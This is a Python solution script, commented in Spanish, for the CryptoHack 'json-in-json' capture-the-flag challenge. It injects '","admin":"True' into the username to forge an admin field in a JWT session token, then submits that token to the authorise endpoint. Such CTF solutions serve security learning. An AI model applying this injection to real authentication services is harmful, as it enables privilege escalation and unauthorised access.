import jwt
import json
import requests

# URL de la función create_session en CryptoHack
create_session_url = "https://web.cryptohack.org/json-in-json/create_session/"

# Inyección del valor en el parámetro username
username = 'username","admin":"True'

# Solicitud para crear sesión con el username inyectado
response = requests.get(f"{create_session_url}{username}/")
session_data = response.json()

# Extraer el token generado
token = session_data['session']
print(f"Generated Token: {token}")

# URL de la función authorise en CryptoHack
authorise_url = f"https://web.cryptohack.org/json-in-json/authorise/{token}/"

# Hacer la solicitud GET a la función authorise con el token generado
auth_response = requests.get(authorise_url)

# Imprimir la respuesta
print(auth_response.json())
